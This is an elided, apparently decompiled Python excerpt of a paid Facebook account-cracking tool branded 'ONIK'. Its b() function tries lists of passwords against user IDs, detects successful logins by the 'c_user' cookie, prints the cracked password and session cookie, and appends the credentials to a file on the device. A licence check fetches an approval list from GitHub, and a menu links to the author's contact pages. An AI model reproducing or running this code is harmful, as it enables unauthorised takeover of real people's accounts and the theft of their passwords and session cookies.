#---------------------[ INFO ]---------------------#
#DECOMPILE  BY U7P4L 1N/MR-ONIK
#JOIN : https://www.facebook.com/mr.onik404?mibextid=V3Yony
#JOIN : https://github.com/MR-ONIK
#---------------------[MODULES ]---------------------#
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801918397961');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/mr.onik404/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/MR-ONIK');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[ONIK]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [ONIK-OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/ONIK-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/MR-ONIK/ONIK-100/blob/main/Aproval.tex").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am ONIK VAI er  ROBOT and my boss is ONIK.Sir this tool is paid because 100% ok id just now login\"")
